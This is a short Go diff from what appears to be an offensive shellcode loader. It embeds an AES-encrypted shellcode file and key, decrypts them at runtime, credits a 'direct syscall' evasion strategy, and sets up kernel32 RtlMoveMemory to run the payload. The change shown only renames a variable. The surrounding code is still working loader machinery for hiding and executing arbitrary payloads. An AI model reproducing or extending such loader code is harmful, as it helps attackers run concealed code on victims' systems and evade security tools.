@@ -14,7 +14,7 @@ import (
 
 var (
 	//go:embed "encrypted_sc"
-	encryptedShellcode []byte
+	encrypted_sc []byte
 
 	//go:embed "key"
 	key []byte
@@ -41,9 +41,9 @@ func decryptAES(data []byte, key []byte) ([]byte, error) {
 
 // Credits to Joff Thyer for Direct Syscall Strategy: https://www.youtube.com/watch?v=gH9qyHVc9-M
 func main() {
-	sc, err := decryptAES(encryptedShellcode, key)
+	sc, err := decryptAES(encrypted_sc, key)
 	checkErr(err)
-	// syscall.SyscallN(uintptr(unsafe.Pointer(&shellcode[0])))
+	// syscall.SyscallN(uintptr(unsafe.Pointer(&sc[0])))
 	kernel32 := windows.NewLazyDLL("kernel32.dll")
 	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
 
